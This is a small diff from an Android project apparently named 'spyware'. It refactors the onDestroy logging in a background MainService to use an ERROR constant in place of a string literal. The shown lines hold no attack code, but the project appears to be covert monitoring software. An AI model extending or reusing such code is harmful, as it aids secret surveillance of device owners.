@@ -7,6 +7,7 @@ import android.content.Intent
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
 import com.example.spyware.common.Constants
+import com.example.spyware.common.Constants.Companion.ERROR
 import log
 import org.json.JSONObject
 
@@ -33,7 +34,7 @@ class MainService: Service() {
     }
 
     override fun onDestroy() {
-        log(this,JSONObject().put("error","MainService stopped"))
+        log(this,JSONObject().put(ERROR,"MainService stopped"))
         super.onDestroy()
         isServiceActive=false
     }
